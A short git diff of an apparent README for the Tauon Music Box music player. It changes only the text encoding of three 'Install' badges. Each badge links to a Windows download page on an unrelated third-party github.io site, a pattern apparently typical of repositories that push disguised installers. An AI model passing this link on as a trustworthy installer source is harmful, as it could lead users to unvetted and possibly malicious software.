@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Tauon Music Box](https://img.shields.io/badge/⬇_Install_Tauon%20Music%20Box-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Tauon Music Box](https://img.shields.io/badge/⬇_Install_Tauon+Music+Box-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Tauon Music Box is a modern desktop music player designed for large local librar
 
 <div align="center">
 
-[![⬇ Install Tauon Music Box](https://img.shields.io/badge/⬇_Install_Tauon%20Music%20Box-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Tauon Music Box](https://img.shields.io/badge/⬇_Install_Tauon+Music+Box-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Tauon Music Box is a modern desktop music player designed for large local librar
 
 <div align="center">
 
-[![⬇ Install Tauon Music Box](https://img.shields.io/badge/⬇_Install_Tauon%20Music%20Box-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Tauon Music Box](https://img.shields.io/badge/⬇_Install_Tauon+Music+Box-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
